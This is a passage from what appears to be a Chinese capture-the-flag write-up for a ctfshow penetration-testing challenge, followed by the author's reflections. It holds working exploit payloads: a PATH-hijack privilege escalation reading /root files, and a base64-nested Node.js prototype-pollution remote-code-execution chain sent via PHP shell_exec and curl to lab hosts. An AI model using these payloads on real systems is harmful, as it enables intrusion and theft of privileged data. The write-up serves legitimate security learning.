
成功提权，接下来读其中内容即可

![](https://s2.loli.net/2021/12/15/4oviFTwCpt1Pzn8.png)

```
1、
curl 172.2.204.5/index.php?u=`echo 'more /root/* > /tmp/win.txt; chmod 777 /tmp/win.txt' > cat && chmod 777 cat && export PATH=.:$PATH && /getflag`

2、
{"__proto__":{"__proto__":{"compileDebug":1,"type":"Code","self":1,"line":"global.process.mainModule.require('child_process').execSync('eval `echo Y3VybCAxNzIuMi4yMDQuNS9pbmRleC5waHA/dT1gZWNobyAnbW9yZSAvcm9vdC8qID4gL3RtcC93aW4udHh0OyBjaG1vZCA3NzcgL3RtcC93aW4udHh0JyA+IGNhdCAmJiBjaG1vZCA3NzcgY2F0ICYmIGV4cG9ydCBQQVRIPS46JFBBVEggJiYgL2dldGZsYWdg | base64 -d`')"}}}

3、
1=echo shell_exec('a=eyJfX3Byb3RvX18iOnsiX19wcm90b19fIjp7ImNvbXBpbGVEZWJ1ZyI6MSwidHlwZSI6IkNvZGUiLCJzZWxmIjoxLCJsaW5lIjoiZ2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2V2YWwgYGVjaG8gWTNWeWJDQXhOekl1TWk0eU1EUXVOUzlwYm1SbGVDNXdhSEEvZFQxZ1pXTm9ieUFuYlc5eVpTQXZjbTl2ZEM4cUlENGdMM1J0Y0M5M2FXNHVkSGgwT3lCamFHMXZaQ0EzTnpjZ0wzUnRjQzkzYVc0dWRIaDBKeUErSUdOaGRDQW1KaUJqYUcxdlpDQTNOemNnWTJGMElDWW1JR1Y0Y0c5eWRDQlFRVlJJUFM0NkpGQkJWRWdnSmlZZ0wyZGxkR1pzWVdkZyB8IGJhc2U2NCAtZGAnKSJ9fX0=;
curl "172.2.204.5:3000/login" -H "Content-Type: application/json" -d "`echo "$a" | base64 -d`"');
```

![](https://s2.loli.net/2021/12/15/mMehig2xSvWudNJ.png)



## 后话

> 恭喜你已经拿到了第二个服务器的最高权限，师傅太强了！ 你能在未知的网络空间里，抽丝剥茧，层层渗透进来，足以证明你拥有高超的技术实力和旁人不具有的坚韧意志 希望你坚持下去，坚持你的热爱，坚持你喜欢的事情，我想，总有一天，你将获得百倍的回报，并让你受用终身 此刻的坚持，是未来发出的光！
>
> ctfshow 大菜鸡 2021年8月7日 04:39 

磨磨蹭蹭的完成了，第一台机子刚出就用ping的非预期打了一部分，后来群主修复后又重新做了一下，断断续续做到第一台机子的提权部分，但始终无果；后面就一拖再拖，也多亏了yuntian师傅的提醒才找到方向。



最近看到很多师傅完成了，碰巧最近把课设做完有了一点空闲时间，就想着尝试一波。这里特别要感谢群主大大以及yuntian师傅和g4师傅，给我的鼓励和帮助。

对我个人来说困难的点主要是这三个吧：

​	一是第一台机子提权，因为搜索的方向始终不对。。最后是问了yuntian师傅才找到方向，万分感谢，可以说没有这一步我也根本无法完成终极考核了

​	二是进内网的时候，一直惯性思维想用msf这类东西，（其实实践已经发现是不出网主机了）后面询问了群主大大才停下这个行为。。

​	三就是传参了，因为各种引号以及格式问题，构造payload是要非常仔细的，这里要感谢g4师傅的建议，体会到编码的好处，可以说学到了新姿势吧

​	其实最大的难点是打破打靶场靶机的惯性思维以及对工具的依赖；
思路转过来之后就顺水推舟了，好好利用拿下的每一个地方和收集到的信息，前面打过的东西说不准能在后面用上~



入门至今不知不觉也满一年了，算不上出类拔萃，但一直在路上。
那就提前祝师傅们新年快乐吧~

